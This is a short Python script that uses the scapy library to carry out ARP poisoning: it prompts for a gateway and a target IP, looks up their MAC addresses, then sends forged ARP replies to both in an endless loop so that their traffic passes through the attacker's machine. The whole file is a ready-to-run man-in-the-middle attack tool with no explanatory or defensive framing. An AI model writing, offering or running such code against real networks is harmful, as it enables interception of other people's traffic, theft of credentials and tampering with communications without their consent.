from socket import timeout
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

gateway= input("Enter gateway IP: ")
target= input("Enter target IP: ")

def get_mac(ip):
    resp, unans= sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip),retry=2,timeout=2)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def arp_poison(gip,gm,tip,tm):
    while True:
        send(ARP(op=2,pdst=gip,hwdst=gm,psrc=tip))
        send(ARP(op=2,pdst=tip,hwdst=tm,psrc=gip))

gwmac = get_mac(gateway)
tmac = get_mac(target)
print(gwmac)
print(tmac)
arp_poison(gateway, gwmac, target, tmac)